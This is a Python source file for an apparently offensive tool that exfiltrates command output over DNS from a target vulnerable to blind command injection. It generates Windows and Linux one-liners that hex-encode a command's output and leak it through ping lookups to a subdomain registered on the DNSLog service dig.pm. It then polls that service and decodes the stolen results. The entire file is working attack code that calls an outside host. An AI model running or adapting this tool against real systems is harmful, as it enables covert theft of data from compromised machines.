import time
import requests
import json
import binascii



requestTime = 3 # DNSLog platform interval per request
commandHex = {}

# commandWin = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.win.{0}'
commandWin = r'del c && del c.txt && command > c &&echo 11111111111>>c && certutil -encodehex c c.txt && for /f "tokens=1-17" %a in (c.txt) do (ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.win.{0} > null ) '
# commandTemLinux = r'rm command7;rm command7.txt;command > command7 &&echo 11111111111>>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'
commandLinux = r'echo -e "`command`\n11111111111" |hexdump -C |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.linux.{0}; done'




def get_new_config():
    global domain,token,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
    url = 'http://dig.pm/new_gen'
    data = { 'domain' : 'dns.1433.eu.org.' }
    dataResult = json.loads(requests.post(url, data=data).text)
    domain = dataResult['domain']
    token = dataResult['token']
    # print(f"\nsubDomain: {domain}", '\n', f"Token: {token}", sep="")
    print('\n----Command Input----')
    cmd = input(">> ")
    if cmd == 'exit' or cmd == 'quit':
        exit(0)
    print("\nWindows:", end="  ")
    print(commandWin.format(domain).replace('command', cmd))
    print("\nLinux:", end="  ")
    print(commandLinux.format(domain).replace('command', cmd))
    
    print('\n----Waiting----')
    
    lastFinishTime = time.strftime("%Y-%m-%d %X", time.localtime()) # record last finish time
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False
    
# get DNSLog data 
def get_dnslogdata() -> list:
    if commandStartPos and commandEndFlag: 
        commandHex[commandName].extend([result[length-1][1]['subdomain'] 
                                        for length in range(len(result),commandStartPos,-1) 
                                        if result[length-1][1]['subdomain'].count('.') == 7])
                                        # Get the command part of the DNSLog data
        tempList = []
        for length in range(commandStartPos,-1,-1):
            if result[length-1][1]['time'] < lastFinishTime:break
            if result[length-1][1]['subdomain'].count('.') == 7:
                tempList.append(result[length-1][1]['subdomain']) 
        commandHex[commandName].extend(tempList)

        return commandHex[commandName]

# deal with DNSlog data, Format the output
def deal_data(data: list):
    global finishOnce
    if commandStartPos and commandEndFlag:
        for length in range(commandStartPos,-1,-1):
            if result[length-1][1]['time'] < lastFinishTime:break
            if result[length-1][1]['subdomain'].count('.') == 7:
                commandHex[commandName].append(result[length-1][1]['subdomain'])
        try:
            hexCommand = { item[:4] : item[4:] for item in commandHex[commandName] } 

            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))

            hexCommand = [ item[1][:32] for item in hexCommand]
        except:
            print('!!!!Error Command format! Try to find DNSLog site(http://dig.pm/get_results) to get conntent..')
            pass
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
        commandResult = ''.join(hexCommand)
        # print(commandResult)
        try:
            commandResult = commandResult.split("0a3131")
            commandResult = commandResult[0] #兼容linux命令
        except:
            pass
        print('\n----Command Result----')
        Head = '\033[36m'
        End = '\033[0m'
        try:
            print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
        except:
            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
        print('----Get Result End!----')
        finishOnce = True


if __name__ == '__main__':
    finishOnce = True
    # get_new_config()
    while True:
        if finishOnce:
            get_new_config()

        for i in range(requestTime,-1,-1):
            
            print('\r', 'Wait DNSLog data: {}s....'.format(str(i)), sep="", end="") 
            time.sleep(1)
        try:
            data = { 'domain':domain, 'token':token }
            url = 'http://dig.pm/get_results'
            #proxies = { 'http':'http://127.0.0.1:8080' }
            result = json.loads(requests.post(url, data=data, proxies=False).text) 
            result = sorted(result.items(), key=lambda x: int(x[0]))
        except:
            print('\r', 'Not Find DNSLog Result!', end='')
            continue
        
        commandStartFlag = 1 if lastRecordLen == len(result) else 0
        lastRecordLen = len(result)
        commandEndFlag = 1 if commandEndPos == len(result) else 0 
        commandEndPos = len(result)
        
        if not commandStartPos and ((result[-1][1]['subdomain'].count('.'))  == 7 or 
                                    commandStartFlag): 
                                    # judge if the DNSLog recording is start
            if result[-1][1]['time'] < lastFinishTime: 
                print('\r', 'Not Find DNSLog Result!', end='')
                continue                     
            commandStartPos = len(result)
            commandName = result[-1][1]['subdomain'].split('.')[1]
            print('\nFind Command Record!...')
            print('----Command: \033[36m{}\033[0m----'.format(commandName))
            commandHex[commandName] = [] 
            print('Wait Command DNSLog Record Finish...')   
        if commandStartPos and ((result[-1][1]['subdomain'].count('.')) != 7 or 
                                commandEndFlag):
                                # judge if the DNSLog recording is over
            commandEndFlag = 1
            #print('Command DNSLog Record Finish...')   

        dataList = get_dnslogdata()
        deal_data(dataList)
